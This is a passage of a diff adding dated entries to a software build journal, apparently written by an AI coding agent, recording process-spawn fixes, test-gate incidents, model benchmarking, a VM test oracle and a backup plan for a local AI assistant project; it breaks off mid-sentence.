+`pythonw.exe`: GUI-subsystem the whole way down (its shim child is pythonw
+too), so no console is ever allocated and Textual takes the same proven
+headless-driver fallback a DETACHED spawn already exercised. I went with
+pythonw over CREATE_NO_WINDOW because the failure mode of "no console at all"
+is one we have already run live for weeks (headless boots), accepting that a
+stray `print` in the driver becomes a silent no-op — tolerable, since every
+output surface in these paths was file-redirected long ago (#670 run-2).
+
+Then the C15 sweep, which is where the fix earned its keep: making the driver
+console-less *inverts* the hazard for its children. pwsh, git, tasklist, uv —
+every one is a console-subsystem exe, and each would now be allocated its own
+fresh visible console: short flashes for git plumbing, and an hours-long
+closable window for the run-fleet subtree — the same defect, reborn one level
+down. For those children `CREATE_NO_WINDOW` is the *correct* tool (no Textual,
+non-interactive by construction, output captured or file-redirected), so
+`_run_to_logfile`, `_run_to_logfile_tree`, the tasklist probe, and — one step
+beyond the ticket's enumerated scope, flagged with an off-ramp —
+`dispatch._safe_run` all carry it now. The constraint pair is pinned in tests
+with the incident named: pythonw (never NO_WINDOW) for anything that boots the
+launcher; NO_WINDOW for console children of the console-less driver. Two
+flags, opposite directions, one property: nothing on the screen to close.
+
+Deliberately NOT merged tonight: the one known failure mode of this change is
+environment-sensitive (Textual's driver-mode fork), so the branch waits for a
+real swap-cycle live-verify tomorrow — the same committed-is-not-done rule the
+night campaign runs under.
+
+**Next:** tomorrow's GPU-free window: one supervised manual swap cycle on the
+merged branch (dispatch → 30B → swap back → AO relaunches with NO visible
+window → Textual boots clean), then merge as #761's close; watch the first
+post-merge battery night for any child window the sweep missed.
+
+*(commit `24b3279` on branch `fix/761-pythonw-spawn-chain`: swap_ops pythonw
+chain + _NO_WINDOW children, dispatch._safe_run NO_WINDOW, battery
+boot_launcher_detached pythonw; +12 regression locks; live swap-cycle verify
+is the merge gate.)*
+
+### 2026-07-08 — The gate that had to watch it happen
+
+*Plain summary: #761 CLOSED — the pythonw swap chain merged (`4ab782f`) after its LA-witnessed live merge gate, which first CAUGHT a real leg-3 defect no offline test saw: the relaunch spawn passed no standard handles, and under pythonw the relaunched launcher crashed encoding its own startup banner to a broken cp1252 stderr (3 retries, SWAP_FAILED). Fix `8a31661`: both detached spawns mirror the proven boot wiring — DEVNULL stdin, UTF-8 append logs, PYTHONIOENCODING=utf-8. Second cycle: all legs green, AO back as pythonw/no-window, terminal RECOVERED stamped. Subsystem: fleet swap chain. Lesson 219 minted.*
+
+The reason #761 waited a day was written on the ticket the night it was built: its one known failure mode is environment-sensitive, so the merge gate is a live dispatch cycle you watch, never the unit locks alone. The first cycle paid that discipline back within twelve minutes. The coder did its work, the 30B unloaded, and then the relaunched assistant died three times in thirty seconds — and the crash log showed something the twelve fresh regression locks could not have: a UnicodeEncodeError inside `_banner()`, the launcher's very first print, encoding box-drawing characters to a cp1252 stderr that should not have existed. The relaunch `Popen` had never passed standard handles at all. For weeks that was survivable — invisible, even — because the python.exe child got a fresh visible console with working streams: the exact window this branch exists to remove had been quietly holding up the relaunch's stdio. Take the window away and the child inherits a broken-but-present stderr, and the banner — printed before logging exists, before the config loads, before anything — kills the boot. The unit locks pinned the argv and the creation flags faithfully; the property they exist for lives three processes and one platform quirk away.
+
+The fix is the boot path's own proven wiring, applied to both detached spawns: DEVNULL stdin, an append-mode UTF-8 log file for stdout+stderr (`ao-relaunch.log` beside the swap state; `driver-stdio.log` beside the spec), and `PYTHONIOENCODING=utf-8` so whatever wrapper Python builds on those handles can carry the banner. It also buys something the old visible console never did: the relaunched launcher's pre-logging output — banners, crash tracebacks, the things that only exist when everything else is broken — now lands in a file a diagnostician can read, instead of a window that vanishes with the crash. The comment in the driver spawn claiming "under pythonw a stray print is a silent no-op" was corrected in the same commit; the live crash falsified it, and a comment that claims a property the code does not enforce is governance debt (lesson 47's class, caught before it aged).
+
+The second cycle was the one the gate was designed for: driver up as pythonw with its pid stamped in the swap state, the tiny job through the full production path, the swap-back relaunch landing its banner cleanly in the new log, the assistant back on :5001 as a GUI-subsystem process that cannot own a console, the driver stamping its own RECOVERED — last night's terminal-stamp fix and this branch proving each other in one artifact. The operator's screen stayed empty, and because the old bug's window was the assistant's own console, "no window now, with the relaunched assistant running" is itself conclusive. The job's own verdict — STALLED, VERIFY, a trivial doc task the coder fumbled — is an honest capability datum and exactly the kind of thing this gate was scoped to ignore.
+
+**Next:** tonight's 23:00 battery is the first campaign pass on the window-free chain — watch the `.err`/stdio logs for any child window the C15 sweep missed; the accidental-close window class is otherwise closed.
+
+*(commits: branch fix `8a31661`, merge `4ab782f`; standing gate on merged main 5827/0 exit 0 (slices 4243+1584); evidence: run `20260708-120925-bd`, `ao-relaunch.log` (the UTF-8 banner), swap state RECOVERED + driver_pid 18304; #761 c.1461. The failed first cycle: run `20260708-114711-bd`, crash.log at `_banner`.)*
+
+### 2026-07-08 — The clean room takes its first exam
+
+*Plain summary: the #744 guest-certified oracle went LIVE in an LA-supervised ceremony — the `blarai-oracle` service built and provisioned into the NIC-less Alpine guest (vsock 50002, pytest 9.1.1 offline from the CD ISO), the corridor proven in both directions BEFORE the production wiring was written, the transport registered + knob flipped with all four dormancy locks consciously amended, first light honest, and the consumption half (scorecard agreement vocabulary + morning-report divergence banner) built the same afternoon. Merges `097605d`, `7356d11e`, agentic-setup `ca0a8dd`; record `docs/security/guest_oracle_provisioning_record.md`. Subsystem: fleet swap / guest isolation.*
+
+The ceremony's ordering rule was the day's earlier lesson applied in advance: prove the observable end property before trusting any wiring. So before a single production line was registered, the corridor ran live — the reachability probe through the 3.14 bridge, then a real snapshot through the real channel into the real guest, where a real pytest returned *passed* in 0.40 seconds; then the same oracle over deliberately broken code returning *failed* with the genuine assertion text. A guest that cannot say no proves nothing, and this one said no before it was asked to say yes. Only then did the one-line registration land, and the four locks built to forbid it were amended in the same commit to pin the live posture as firmly as they had pinned dormancy — the registration-containment scan now names `swap_ops` as the single sanctioned wiring site, the same way the old scan named zero.
+
+Two judgment calls shaped the build. The oracle got its own guest service on its own port rather than a second op on the proven parser listener — coupling two capabilities whose ceremonies were separate LA decisions was rejected at the transport build, and the same reasoning held at the guest: `provision_oracle.sh` cannot touch the parser install even by accident, because it never opens the parser's directories. And the guest bundle forced a small honesty fix in the executor module itself: its import of the acceptance module would have dragged the whole decompose machinery into a VM that must carry stdlib and pytest only, so the pinned oracle paths are redeclared locally with a host-side lock holding the copies equal — the parser service's own redeclaration precedent, reused rather than reinvented.
+
+The amendment pass also caught the week's recurring class one more time: the first post-flip gate run *reached the real guest from inside pytest* — the old dormancy test called the now-live call site, which now builds a real transport, which found a real listener. Nothing was harmed, but a test suite that opens a production corridor is the same species as the gate that killed OVMS on Monday and the detector that aimed at the AO last night. The lock now injects a factory seam, and its docstring names the incident so the next author knows why.
+
+First light was honest rather than triumphant, which is better. The driver fired the phase in the RAM-free window — the one moment neither model holds the box — and wrote a certificate reading `not-run, flat-queue-mode`: the tiny ceremony goal had collapsed to a single task, the plan degraded to flat-queue, and there was no job oracle to certify. The machinery told the truth about having nothing to grade, which is precisely the property the whole corridor exists to protect. The graded certificate self-proves tonight, four times over, because the last piece built this afternoon was the half that lesson 46 demands: a reader. Scorecards now fold the certificate into evidence under a closed agreement vocabulary, the battery summary accumulates the host-vs-guest matrix, and the morning report prints per-job agreement with a banner that cannot be missed on any DIVERGENCE — because an isolation certificate nobody reads is a verification line nobody reads, and this project has already paid for that lesson once this week.
+
+**Next:** tonight's battery is measurement pass 1 of the agreement matrix (four Python plan-mode jobs per pass); at ~20 certificates the LA decides whether divergence gates; node-in-the-guest and mTLS activation are the tracked future scope on #744.
+
+*(commits: build `f701deb`, go-live `70fb195`/merge `097605d`, consumption `3e4cbc2`/merge `7356d11e`, agentic-setup morning-report `ca0a8dd`, record `ffa48821`; gate 5843/0 exit 0 post-wiring; ceremony evidence in the provisioning record §3/§5. Tickets: #744 c.1462.)*
+
+### 2026-07-08 — Closing the last window and right-sizing the room
+
+*Plain summary: two operator-surfaced afternoon fixes. (1) The OVMS 30B server spawned a visible `C:\ovms\ovms.exe` console — the #761 sweep's inverted-hazard one level deeper (a console child of the now-console-less pythonw driver) — fixed by `-WindowStyle Hidden` on the OVMS + tool-proxy spawns (safe ONLY because they are non-interactive with file-redirected output; the Textual launcher must never be hidden). (2) B3's per-card run envelope: the 5-unit fan-in card genuinely needs ~6 h, so `run_budget_s` became an optional per-card field threaded to both the driver watchdog (consume-once budget file) and the harness monitor, rather than shrinking the card or raising the global default. agentic-setup `a69d3e7`; blarai `3f3a32ef`. Subsystem: fleet spawn hygiene / battery envelope.*
+
+Both of the afternoon's fixes came from the operator looking at his own screen, which is the verification surface no test suite replaces. The first was the mirror image of a fix from the morning: #761 made the swap driver console-less via pythonw, and lesson 219 had already named the consequence — every console-subsystem child of a console-less parent gets its own fresh visible window. The morning sweep caught the pwsh and git children; it did not reach OVMS, because OVMS is spawned one layer further out, by the launcher's own start-llm script rather than the driver. The operator watched it appear on every model load and asked the obvious question: can we do to this what we did to the assistant's window. We could, and the two-flag rule from lesson 219 told us exactly how — Hidden is correct here precisely because OVMS is the opposite of the launcher: a non-interactive console server whose stdout and stderr are already file-redirected, with no Textual driver to crash on a console-less start. The same flag that would break the TUI is the right flag for the server. I live-verified it before tonight's battery: one dispatch cycle, the operator confirming no OVMS window while the 30B served.
+
+The second fix was a decision disguised as a config value, and it deserved the care. B3 — the Stage-2 web demo, a five-unit fan-in — had stalled honestly on the 3-hour budget three nights running, because its node/web tasks measured 40 to 85 minutes each. The tempting fixes were both wrong in instructive ways. Shrinking B3's card to fit the envelope would have quietly changed what the campaign measures: the card's whole purpose is the wave-count and dependency-edge fan-in, and a smaller B3 is a different experiment wearing B3's name. Raising the global run budget to six hours would have let a genuinely wedged short job burn six hours before the watchdog caught it — trading a false timeout for a slow one. The honest answer was per-card: B3 declares its own six-hour envelope, every other card keeps the tight default, and each number stays measured rather than guessed. The build's real work was threading that budget to the bound that actually kills a job — the AO-side driver watchdog, which lives in a different process from the battery runner and stays up across jobs. A live-protocol change or a per-job reboot were both heavier than the problem; a small consume-once budget file, staged by the runner moments before dispatch and read-then-deleted by the AO at swap-fire, reaches the watchdog per-job with a freshness guard so a budget written for a dispatch that never fired can never bleed into a later job. Every card without a declared budget clears the file and restores the default, so tonight's six-job run is byte-identical to what it would have been — the envelope is inert until a card opts in.
+
+The thread I want to keep from the day: three of the last four fixes surfaced from the operator's screen, not the gate — the assistant's window, the OVMS window, the flat-queue certificates he asked the value of. A 5,800-test suite proves the mechanisms; a person watching proves the system. The gate and the screen are different instruments, and the screen keeps finding what the gate structurally cannot.
+
+**Next:** B3 rejoins the campaign as a one-line jobs-list edit whenever the six-job baseline has banked; tonight's run is the six-job set, canary-active, guest-oracle-live, on the window-free chain.
+
+*(commits: agentic-setup `a69d3e7` (OVMS/proxy hidden, live-verified); blarai `3f3a32ef` (B3 per-card envelope, +15 locks, gate 5864/0). Both operator-surfaced; lesson 219 (OVMS) + #740 (B3). Certificate-consumption arc is in the ceremony entry above.)*
+
+### 2026-07-08 — The estimate the kernels cut in half
+
+*Plain summary: first measured Qwen3.6-27B run on the Arc 140V (Stage-1 successor smoke, #768) —
+coherent (openvino.genai #3870 does not reproduce), fits the ceiling, but decodes at 3.6 tok/s
+sustained vs the 5.5–7 bandwidth estimate; new VLMPipeline benchmark harness
+`scripts/benchmark_vlm_text_inference.py`; results in PERFORMANCE_LOG.md +
+docs/MODEL_EVALUATION_QWEN36_27B.md. Recurrence of lesson 151.*
+
+The successor question came back today wearing a new coat — the Lead Architect kept seeing
+Qwen3.6-27B and its ThinkingCap fine-tune in the wild and kept forgetting why we couldn't use
+them. The research sweep found the answer had genuinely moved: the model now runs on our exact
+substrate, it is natively multimodal (one model would absorb both the 14B brain and the separate
+vision model), and the blockers had narrowed to a missing speculative-decoding path, an open
+coherence bug, and speed. I estimated speed from first principles — the repo's own 14B and 8B
+measurements both back out the same ~90 GB/s effective bandwidth, and 14 GB of dense INT4 weights
+divided into that gives ~6.4 tok/s, with a physics ceiling near 9.7. The LA weighed the
+capability against the number and accepted ~6.5. That acceptance converted an estimate into an
+obligation: measure it.
+
+The measurement disagreed with me, and the disagreement is the lesson. Median sustained decode
+came in at 3.59 tok/s — barely half the bandwidth math. The tell was not in the decode column but
+in prefill: 219 tokens/sec where the dense 14B does ~1960 on identical silicon. Weight streaming
+cannot produce a 9x prefill gap; unoptimized kernels can. Qwen3.6's Gated-DeltaNet hybrid (48 of
+64 blocks are linear-attention) is new to the GPU plugin, and the plugin plainly runs it
+compute-bound. My bandwidth model wasn't wrong — it was an upper bound dressed as a central
+estimate. The trade-off ledger for a bandwidth-bound assumption should have carried the named
+alternative: *or the kernels aren't there yet, in which case all bets are below the line.* I had
+even written the pass criterion for this ("a wildly lower number means something is misconfigured,
+not that the estimate was wrong") and the truth split the difference: nothing was misconfigured,
+and the estimate was still not the number.
+
+The run also delivered the finding that keeps the door open: openvino.genai #3870 — Qwen3.6-27B
+producing incoherent output on GenAI, reported on our exact runtime — does not reproduce here.
+All twenty captured generations are clean: correct facts, orderly thinking traces, no
+degeneration. The disqualifier was the bug; the bug is absent on 2026.2.1 + the 8826 driver + the
+official INT4 build. What remains is purely a software-maturity clock: the physics allows ~9.7,
+the kernels currently deliver 3.6, and both the harness and the 14.6 GB of weights now sit
+resident so re-measuring at each OpenVINO version bump costs one command. Verdict recorded:
+below the accepted floor, Stage 2 (ThinkingCap conversion) not triggered, and kernel-maturity
+joins the revisit triggers alongside the spec-decode path and the (now-moot-here) bug closure.
+
+Operationally, this was also the first GPU run scheduled through the battery campaign's manager
+rather than around it — a coordination message, an affirmative window grant with terms (exclusive
+GPU, 22:30 hard-stop, AO left down for the 22:45 preflight), and a clean handback with memory
+fully recovered. The overnight window is no longer mine to assume; asking first cost twenty
+minutes and bought zero contention.
+
+*Same-evening addendum — the thread-read that rewrote the findings, and the switch the model
+reads and refuses.* Before drafting the upstream report the LA asked for, I read the actual
+#3870 thread instead of trusting the research sweep's summary — and it rewrote two of my own
+records: the bug was CLOSED a month ago (conversion-side, self-converted models only, official
+weights never affected), and its failure mode was long-prompt-dependent while my coherence
+evidence was short-prompt. Both records corrected same-day; the lesson is the cheap one that
+keeps recurring in this repo's history: read the primary source before citing it externally —
+the sweep's "open bug on our exact runtime" survived three documents before one thread-read
+killed it. The same read surfaced what the sweep had missed entirely: DFlash-on-OpenVINO is an
+open, Intel-authored enablement effort (genai #3938) — the spec-decode blocker got a tracking
+number. Two upstream comments posted with LA approval (openvino #36270, genai #3938). Then the
+LA asked the right question — does the thinking toggle actually break the Policy Agent? — and a
+three-condition probe on the still-warm 27B answered it in ten minutes: `/no_think` is not just
+ignored, the model *quotes the constraint inside its own thinking trace* and reasons on;
+`enable_thinking=False` is accepted by the API and ignored by the model; and the emitted
+chain-of-thought is untagged, so even the AO's strip logic would be blind to it. The hardest
+swap blocker turned out not to be the speed I measured all afternoon but a chat-template defect
+found in the last hour — genai #3937, now reproduced on the 27B on release wheels, probe and
+evidence preserved (`scripts/probe_qwen36_thinking_toggle.py`).
+
+**Next:** re-run the harness + the thinking-toggle probe at the next OpenVINO version bump
+(single commands, weights resident); watch the four triggers in
+`docs/MODEL_EVALUATION_QWEN36_27B.md` (#3938 DFlash, kernel maturity, long-prompt coherence,
+#3937); Draft 3 (the #3937 upstream confirmation) was approved and posted the same evening
+(#768 c.1469) — all three upstream comments are live.
+
+*(commits `416e5a31` (Stage-1 smoke: harness + eval doc + PERFORMANCE_LOG entry + fragment),
+`f5632168` (#3870 scope correction + upstream watches), `6291c9ba` (#3937 probe, REPRODUCED),
+`44c2da53` (addendum); benchmark JSON
+`docs/performance/benchmark_vlm_text_qwen3.6-27b-int4-ov_2026-07-08_16-21-18.json`;
+Vikunja #768 carries the verdict; Stage 2 not triggered. Lesson 151 tallied at fold —
+a first-principles estimate is itself a measurement of the WRONG scenario (mature kernels)
+until the immature-kernel alternative is named.)*
+
+### 2026-07-08 — The certificate that killed the night
+
+*Plain summary: the #744 guest-oracle consumption half wrote a dict into
+scorecard evidence; the fail-closed writer refused it outside the per-job
+try, killing the first fully-armed battery pass 4 minutes in. Fixed
+(string contract + degrade-to-STALLED containment), merged `d0294595`,
+relaunched same night. Dispatch harness / battery runner. Lesson 46
+recurrence (fifth instance); new lesson (220).*
+
+Tonight was supposed to be the first pass with everything live at once —
+canary, guest oracle, window-free chain, the six-job set. It lasted four
+minutes. B1 dispatched at 23:02, stalled honestly at 23:05 (the 30B swap
+aborted on its memory guard — a separate, operational finding), and then
+the runner sat down to write B1's scorecard and never got up:
+`refusing to write an invalid scorecard: evidence['guest_oracle'] must be
+a string, got dict`. Zero scorecards. Runner exit 1. The whole night's
+instrument died writing its first record.
+
+The irony is that every component behaved exactly as designed. The guest
+oracle wrote its advisory certificate — even for a flat-queue job it
+correctly said `not-run: flat-queue-mode`. The consumption half (built
+three days ago under the "an instrument nobody reads does not exist"
+banner) dutifully folded that certificate into the scorecard evidence.
+The scorecard writer, fail-closed by ratified contract — evidence is
+strings only, pointers and short statuses, never structures — refused
+the dict. Each piece kept its promise; the seam between them had never
+once been exercised. The consumption tests covered the agreement truth
+table and the fail-soft reads, but nobody ever drove a folded card
+through the real writer. Tonight was the first night a certificate
+existed at write time, so tonight was the first execution of that line —
+in production, unattended, with the whole pass riding on it.
+
+The second half of the defect is subtler and cost the night rather than
+the job. `adopt_driver_scorecard` validates its result and degrades an
+unadoptable card to STALLED — the runner's own code states the contract:
+"one job's crash must not sink the battery." But the #744 evidence fold
+happens *after* adoption, mutating a validated card, and the final
+`_write` sits *outside* the per-job try. So the fail-closed writer —
+correct to refuse — had nowhere to put its refusal except up through the
+event loop. A validation designed to protect the record archive ended up
+deleting the archive.
+
+I took both fixes, not just the typo-shaped one. The fold now emits the
+evidence contract (`guest_oracle_evidence()` — string, one line, capped),
+with the exact killing certificate as a regression case through the real
+writer. And a writer-refused composed card now degrades to the fail-loud
+STALLED [HARNESS] scorecard: the refusal still stands — no invalid record
+ever lands — but it costs that job, never the night. The alternative I
+rejected was loosening the writer to accept dicts: the strings-only
+contract is load-bearing (S6, never raw logs in a scorecard), and the
+consumer was wrong, not the gate. 63/63 on the battery file, 1298/0 on
+the integration+security slice, LOCALAPPDATA-redirected, merged
+`d0294595`, relaunched through the guarded scheduled task by 23:35.
+
+B1's own stall is a datum for the morning: the box was ~2.5 GB heavier
+than previous nights (a browser and a sync client resident), and the 30B
+swap needs 21 GiB free after the 14B unloads. The honesty spine held
+throughout — nothing false-passed; the failure was loud, attributed, and
+four minutes from fired to diagnosed.
+
+**Next:** the relaunched pass (fixed runner) banks or teaches; the
+morning summary carries the first real guest-agreement rows; the
+box-leanness preflight step (memory headroom vs the 30B guard) wants a
+durable home in the nightly launcher rather than in watch-session lore.
+
+*Morning addendum (2026-07-09):* it taught, then banked in installments. The
+fix held across three further passes (every scorecard landed, including the
+degraded-path never firing once); attempt 2 measured the lean gap six times
+over (the operator's browser held the exact missing margin — the Stop-Process
+permission denial cost the night ~2.5 h until he woke and authorized it);
+attempt 3 found the monitor's verify blind spot (its own fragment); attempt 4
+produced B2's second consecutive GREEN and B4's first honest full-length run.
+The guest oracle's first real rows all read `deps-unavailable: hypothesis` —
+the offline guest can't import the property-testing library the cards' oracles
+use (#744 c.1508, the re-provisioning is daylight work).
+
+*(commits `9c1c772f` (fix + 2 locks) → merge `d0294595`; first live
+verify = the relaunched night-20260708 pass.)*
+
+### 2026-07-09 — The detector that doomed the verify, and the zombie it left behind
+
+*Plain summary: the battery monitor's 90s doom window killed B4 inside the
+verify gate's own 600s budget (unwatched uv/ruff workers + write-at-completion
+checks = a working gate indistinguishable from a dead run); the doomed stop then
+failed to actually stop the dispatch, wedging the AO for every later job. Window
+raised to 240s + verify workers watched (merged `8a9e725d`, timeout-registry
+row); the stop-contract gap ticketed as #771. Fix live-proven same morning:
+attempt 4's B4 sailed through the exact wave that died. Dispatch harness /
+monitor. Lesson 216 third instance (control shipped at the tally); new lesson
+(221); pairs with lesson 217.*
+
+Attempt 3 was the night's best pass right up until the monitor shot its own
+runner. B4 had passed two integration gates and its wave-3 candidate had just
+entered "[3/5] Verifying (build/typecheck/lint)" — a step the pipeline grants
+600 seconds — when the doom detector, seeing ninety seconds of quiet logs and
+no process it recognized, declared the run dead and stopped it. The gate's
+checks write nothing until they finish, and its workers are native binaries
+(`uv`, `ruff`) the CPU probe had never been taught to watch. Inside that
+blind spot, a working verify and a hung one produce identical signals, and the
+detector chose the pessimistic reading at one-seventh of the budget the step
+was explicitly promised. The kill also preempted the harness's own failure
+handling — the candidate had failed a unit test and best-of-N would have
+resampled it honestly.
+
+The second act was worse. The doomed stop turned out to be advisory: the fleet
+loop started building a fresh candidate nine minutes AFTER the stop, OVMS kept
+the GPU, the swap state pinned at CODE, and the AO could not come back — so B5
+and B7 stalled in seconds on honest connection refusals while a zombie dispatch
+ground on toward its watchdog. The per-job re-ensure did exactly the right
+thing by refusing to boot an AO over a live driver (#758's hands-off
+semantics), which is the uncomfortable part: every component obeyed its local
+contract, and the composition still burned the pass. One detector fired early,
+one stop didn't stop, and the safety interlock correctly refused to intervene.
+
+The fix took both halves I could take tonight offline: the verify workers
+joined the watched-name list, and the doom window rose to 240 seconds —
+registered in the timeout registry with the incident and the shrink path (a
+per-step heartbeat from verify-project.ps1 would let it tighten again). The
+alternative I rejected was teaching the monitor the gate's step structure —
+correct in principle, but it couples the monitor to another repo's script
+internals; the registry row names the heartbeat as the durable follow-up
+instead. The stop-that-doesn't-stop is #771, a daylight fix with two limbs
+(honor the cancel between candidates; tear down promptly on a stop) that wants
+a watched live-verify, not a 5am merge.
+
+The proof came four hours later and could not have been cleaner: attempt 4's
+B4 ran the identical card on the fixed monitor, spent fifty silent minutes in
+the same waves, passed the gate that died, reached its acceptance wave, and
+parked honestly when the job oracle failed its integrated tree — 8,422 seconds
+of exactly the behavior the campaign exists to measure, sixteen minutes inside
+budget, zero interventions. Meanwhile B2 went GREEN for the second consecutive
+attempt — the campaign's first green, reproduced — and the LA extended the
+morning to complete B6 standalone, ruling that a clean five-job pass plus an
+honest B6 composes the campaign's first full-set bank.
+
+**Next:** #771 (the advisory stop) in daylight with a watched live-verify; the
+verify-gate heartbeat as the registry row's shrink path; the composite B6 bank
+per #740 c.1519; the supervised B8 regression re-run on the changed machinery
+(LA-invoked, per the ceremony posture).
+
+*(commits `eac4b429` (fix + 4 locks) → merge `8a9e725d`; live proof = attempt 4
+`night-20260709-055439` B4 PARKED-HONEST 8422s; incident record #740
+c.1517/c.1518; zombie ticket #771.)*
+
+### 2026-07-09 — Building the instrument before touching the lock
+
+*Plain summary: standalone prefix-caching A/B harness shipped
+(`scripts/benchmark_prefix_caching_ab.py` + 72 offline lock tests, #711) —
+angles S1–S7 per the LA-approved plan plus the new S8 pinned
+preference-block cost curve; no run performed, no production change.*
+
+`enable_prefix_caching=True` has been the production posture since ADR-012
+Amendment 3, locked on two happy-path numbers. The plan
+(`docs/performance/prefix_caching_ab_validation_plan.md`) demanded the
+re-validation rest on the full angle set — including the cases that could
+make caching a *bad* trade on a 31.3 GiB iGPU — with the decision criteria
+pre-committed before any measurement. This session built the instrument,
+deliberately without running it: the Arc 140V belongs to the fleet in this
+window, and a benchmark interleaved with a live dispatch is garbage data.
+That constraint became the harness's first feature — a refuse-to-start
+guard (AO port 5001 probe + OVMS process scan) that fails loud with exit 2
+rather than queueing. It fired for real on its first smoke: the fleet's
+`ovms.exe` was alive, and the guard refused — the one behavior I could
+live-verify without the GPU, verified.
+
+The load-bearing design call was *which pipeline to benchmark*. The kv
+sweep (#709) builds its own `LLMPipeline`, which is right for isolating an
+engine property but wrong for re-validating a production lock — a mirrored
+build drifts silently when the launcher's config evolves. So the primary
+arms go through `build_shared_pipeline(..., enable_prefix_caching=<arm>)`
+itself — the exact seam the launcher calls, spec-decode and
+`cache_size=3` included — and only the non-production controls (the
+right-sized-cache arm, the S5 spec-OFF sub-arm) use a mirrored direct
+build, labelled `direct_control` in the output so the two are never
+conflated. I went with the production seam accepting that it hardcodes
+`cache_size=3` (the controls exist precisely to vary it), rejecting the
+alternative of parameterizing the production builder — a runtime-code edit
+this ticket has no business making.
+
+The #709 protocol properties carried over intact rather than being
+re-derived: fresh pipeline per (angle x arm) with del/gc/settle, warm-up
+discarded before timing, inter-combo cooldown or the --steady-state
+thermal plateau, and the first-combo cleanliness gate (a minimum-free-RAM
+floor before the first build) — lesson 8's third-instance control,
+preserved by inheritance instead of re-learned by pathology. The S8 angle
+got the most careful builder work because its physics are the easiest to
+corrupt: every block size carries its size tag in every line so no two
+sizes share a token prefix (a cross-size cache hit would fake the cost
+curve), the block renders byte-identical every time (locked by test), and
+the one-line-edit variant changes exactly one line at a fixed position
+(also locked). Cold and post-edit TTFTs are honestly single-shot — the
+first exposure consumes the cache state, so they cannot carry an N>=5
+aggregate; the JSON says so instead of pretending.
+
+**Next:** the daylight GPU window runs the rig-validation dry pass
+(`--angles S1,S3 --runs 2 --warmup 1`, app closed) and then the full
+matrix; the JSON + PERFORMANCE_LOG entry land per the community-grade
+mandate, and the keep-ON / turn-OFF / workload-conditional call goes to
+the LA against the plan's pre-committed criteria.
+
+*(commit `c230d911` (harness + 72 offline lock tests on
+`feat/711-prefix-caching-harness`), merge `c4e4315c`; 98 passed / 1 benign
+model-absent skip across both benchmark test files; the model-in-the-loop
+matrix awaits the GPU window.)*
+
+### 2026-07-01 — Packing the house before the fire
+
+Today the system got something it has never had in eight months of building:
+an existence outside this one disk. The trigger was operational — the
+User-Operator wants to reformat the drive — but the discovery pass turned up
+a fact worth sitting with: **not one of the five live repos had a git
+remote.** BlarAI's 401 branches, the full ADR corpus, BUILD_JOURNAL.md
+itself, the coding-fleet dispatch program, the jobhunt tool — every commit of
+all of it existed exactly once, on the hardware it was written on. We had
+built a security-first system with TPM-sealed keys and fail-closed egress,
+and its single point of failure was a SATA connector.
+
+The backup now has three legs, chosen by what each store is good at. GitHub
+(private repos) carries the five repos — 398 of blarai's 401 branches, with
+uncommitted work captured first as `backup/wip-*-20260701` snapshot branches
+built through a temporary index so no working tree was touched mid-flight.
+OneDrive carries what git can't: the 33.7 GB of converted model weights, the
+encrypted runtime databases with their TPM-wrapped keystores, the Vikunja
+database (snapshotted live via SQLite's backup API), the OVMS install, the
+Claude memory namespaces, the Hyper-V VHDX, and full `git bundle` files of
+all five repos — including the three branches GitHub refused because an old
+Intel-PR-reproduction commit carries a 385 MB model binary. A USB-bound
+secrets bundle carries the keys and credentials, deliberately staged OUTSIDE
+the cloud path — the permission classifier balked at SSH keys heading to
+OneDrive, and rather than route around the objection I put the question to
+the operator, who chose the air-gapped leg. The trade-off is a manual step
+(copy one folder to a stick) bought for keeping key material off Microsoft's
+servers; the rejected alternative was convenience.
+
+Two discoveries would have made a naive backup silently worthless. First,
+the at-rest encryption: the DEK keystore JSONs copy cleanly, but they are
+sealed to THIS machine's TPM — the copies are only decryptable via the
+`--recover` ceremony with the offline recovery key printed once at
+provisioning. A backup of the databases without confirming that key exists
+is a backup of noise; the runbook now leads with it. Second, the "dirty
+worktrees" that weren't: two `.worktrees/` directories reported 33 modified
+files each, matching main's count exactly — orphan directories whose `.git`
+files were gone, letting git walk up to the parent repo and report its state
+as theirs. I snapshotted them before noticing, then deleted the two junk
+branches. The lesson from the #714/#715 arc holds here too: match the
+measurement to the thing you think you're measuring.
+
+What was deliberately left behind: 124 GB of `oss/` OpenVINO upstream clones
+(clean, pushed, re-cloneable — a 900-byte patch file preserves the one local
+tweak), the 15 GB coder-30b (one HuggingFace download), ~34 GB of compiled
+model caches, every `.venv`, and the graveyard of fleet test projects. A
+backup that includes everything is a backup nobody audits.
+
+**Next:** operator copies `reformat-secrets` to USB and confirms the offline
+recovery key is findable; OneDrive sync runs to "Up to date"; then the
+reformat, and `RESTORE_RUNBOOK.md` (OneDrive backup root) drives the rebuild
+phase by phase, ending with the standing gate as the proof the house moved
+intact.
+
+### 2026-07-04 — The film that had to earn every second
+
+*Plain summary: the BlarAI portfolio demo film went v1→v9 across two nights —
+re-recorded segments, a real dispatch-built website as the payoff, an
+illustrated fingerprint-gate sequence generated by BlarAI itself, and an
+original score composed and synthesized entirely on the laptop. Along the way
+the dispatch idle-breaker's blind spot for slow single-file writes was found,
+worked around, and filed (#779; the filing was deferred by a Vikunja outage and landed at the 2026-07-09 fold). New lesson (227). Portfolio media lives outside the repo at
+`C:/Users/mrbla/Videos/BlarAI_portfolio/` (v9 is the finished film).*
+
+The demo film was supposed to be a wrap-up task: record the features, cut
+them together, ship. It became a nine-version essay in what "professional
+grade" actually costs. The Lead Architect reviewed every cut and his notes
+were consistently right: a seven-second hold on a blank chat window is not
+patience, it is dead air; a lower-third that covers the input box hides the
+one thing the shot exists to show; two narrators talking over each other is
+not atmosphere. The fixes were not editing tricks — they were the discipline
+of looking at each shot and asking what it proves.
+
+Two failures are worth keeping. First: the Meridian website — the film's
+climax, a real site built by BlarAI's coder fleet — refused to exist twice.
+The fleet's idle circuit-breaker killed the 30B coder mid-write both times,
+reading "no new step/edit for 240s" as *stuck* when the truth was *slow*: a
+single large HTML write emits no intermediate progress signal the detector
+can see. The seaquotes CLI had succeeded hours earlier only because its tasks
+decomposed into small fast writes. I raised the timeout to 600s for one run
+(the build then completed and merged cleanly — gates green, site live in a
+browser), and reverted to 240s immediately: the fast-kill default is the
+operator's explicit dev-cycle preference, and a demo is not a mandate to
+re-tune the fleet. The durable fix — a progress signal the detector can
+actually see during long generations — is filed for the #670 dispatch epic
+(see `_PENDING_vikunja_updates.md` in the portfolio folder; Vikunja MCP was
+down for rotation this session).
+
+Second: music synthesized from raw code failed twice before it worked. The
+first bed was sustained sine stacks — the LA called them "annoying piercing
